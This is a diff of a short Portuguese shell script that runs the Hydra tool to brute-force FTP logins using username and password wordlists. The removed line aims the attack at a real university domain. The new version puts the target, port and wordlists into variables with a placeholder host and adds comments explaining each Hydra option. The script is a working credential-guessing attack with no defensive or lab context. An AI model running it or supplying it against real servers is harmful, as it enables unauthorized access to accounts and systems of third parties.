@@ -8,6 +8,17 @@
 # Data de atualização: 31/10/2016
 # Versão: 1.0
 
+#Variável do comando Hydra
+ALVO="www.SEU_ALVO.br"
+USERNAME="usuarios.txt"
+WORDLIST="senhas.txt"
+PORT="21"
+SERVICE="ftp"
 
-
-hydra -f -s 21 -t 5 -vV -f -L usuarios.txt -e ns -P senhas.txt www.uninove.br ftp
+#Executando o comando Hydra com a opções: -s=Porta, -e=Checagens Adcionais, -f=Após confirmação de Login, sair do acesso, -vV=Modo Verboso, detalhado na hora de passar usuário e senhas, -L=Wordlist de Usuários, -P=Wordlist de senhas, -t=Tarefas/Tentativas
+#Informações levantadas utilizando o comando Nmap
+echo -e "Executando o comando Hydra no alvo: $ALVO"
+echo
+hydra -f -s $PORT -t 5 -vV -f -L $USERNAME -e ns -P $WORDLIST $ALVO $SERVICE
+echo
+echo -e "Fim da execução `date`"
